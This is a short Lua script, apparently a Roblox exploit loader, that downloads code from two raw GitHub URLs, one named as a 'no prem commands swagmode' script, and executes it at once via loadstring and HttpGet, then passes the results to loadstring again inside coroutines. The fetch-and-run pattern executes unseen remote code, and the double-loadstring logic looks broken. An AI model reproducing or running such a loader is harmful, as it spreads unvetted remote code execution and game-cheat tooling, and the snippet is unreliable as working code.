local script1 = loadstring(game:HttpGet("https://raw.githubusercontent.com/Allvideo/test/main/Whitelist.txt"))()
local script2 = loadstring(game:HttpGet("https://raw.githubusercontent.com/NooobLorod/loadstrings/main/no%20prem%20commands%20swagmode.lua"))()

local function executeScript(script)
    local thread = coroutine.create(function()
        loadstring(script)()
    end)
    coroutine.resume(thread)
end

executeScript(script1)
executeScript(script2)
